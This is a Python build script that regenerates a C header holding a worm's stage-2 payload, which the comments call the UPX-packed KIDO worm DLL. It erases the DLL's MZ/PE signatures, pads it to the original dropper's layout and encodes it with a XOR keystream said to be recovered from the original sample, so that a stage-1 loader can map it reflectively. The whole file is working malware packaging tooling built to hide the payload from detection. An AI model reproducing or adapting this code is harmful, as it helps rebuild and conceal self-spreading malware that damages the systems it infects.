#!/usr/bin/env python3
# gen_stage2_payload.py - regenerate src/wrapper/stage2_payload.h
#
# Takes the UPX-packed stage-2 DLL (kido_stage2.dll), erases its MZ/PE
# signatures EXACTLY as the original kido.sample stores its embedded blob
# (the original erases these so the loader cannot find the image by magic),
# zero-pads to the original .data layout (0xA600 = 42,496 bytes), and encodes
# it with the EXACT position-dependent XOR keystream recovered from stage 1:
#
#     key[i] = ((((i | 0x0A0A0082) << 1) ^ 0xC41972EB) - 0x86E61B46) & 0xFFFFFFFF
#     enc[i ^ 0x37] = dword[i] ^ key[i]          (little-endian dwords)
#
# The decoder in src/wrapper/loader.cpp is the exact inverse, so a fresh build
# of stage-1 decodes bit-for-bit the same bytes the test harness verified.
import sys, os, struct

K   = 0x0A0A0082
C1  = 0xC41972EB
C2  = 0x86E61B46
BX  = 0x37
SIZE = 0xA600  # 42,496 bytes, original stage-1 .data blob layout

def main():
    here = os.path.dirname(os.path.abspath(__file__))
    root = os.path.dirname(here)
    src  = sys.argv[1] if len(sys.argv) > 1 else os.path.join(root, 'build', 'kido_stage2.dll')
    dst  = sys.argv[2] if len(sys.argv) > 2 else os.path.join(root, 'src', 'wrapper', 'stage2_payload.h')

    d = open(src, 'rb').read()
    if len(d) > SIZE:
        sys.exit('error: %s is %d bytes > %d' % (src, len(d), SIZE))
    el = struct.unpack_from('<I', d, 0x3C)[0]
    b = bytearray(d)
    b[0] = b[1] = 0                        # erase MZ
    b[el] = b[el+1] = b[el+2] = b[el+3] = 0  # erase PE signature
    b += bytes(SIZE - len(b))              # zero pad to the original layout

    ndw = SIZE // 4
    enc = [0] * ndw
    for i in range(ndw):
        key = ((((i | K) << 1) ^ C1) - C2) & 0xFFFFFFFF
        val = struct.unpack_from('<I', b, i * 4)[0]
        enc[i ^ BX] = val ^ key

    lines = []
    lines.append('/* Auto-generated by tools/gen_stage2_payload.py - DO NOT EDIT BY HAND.')
    lines.append('   Stage-2 payload (the UPX-packed KIDO worm) encoded with the EXACT')
    lines.append('   original position-dependent XOR keystream. Buffer is %d bytes (0x%04X)' % (SIZE, SIZE))
    lines.append('   with the MZ/PE signatures erased and zero-padded to the original stage-1')
    lines.append('   .data layout. Decoding (src/wrapper/loader.cpp) maps it reflectively. */')
    lines.append('#ifndef STAGE2_PAYLOAD_H')
    lines.append('#define STAGE2_PAYLOAD_H')
    lines.append('#include <stdint.h>')
    lines.append('static const uint32_t g_stage2_enc[%d] = {' % ndw)
    for r in range(0, ndw, 16):
        chunk = ', '.join('0x%08Xu' % v for v in enc[r:r+16])
        lines.append('    ' + chunk + ',')
    lines.append('};')
    lines.append('#define STAGE2_ENC_SIZE 0x%04XU' % SIZE)
    lines.append('#define STAGE2_ENC_DWORDS %dU' % ndw)
    lines.append('#endif')
    open(dst, 'w', newline='\n').write('\n'.join(lines) + '\n')
    print('wrote %s (%d dwords, from %s)' % (dst, ndw, src))

if __name__ == '__main__':
    main()
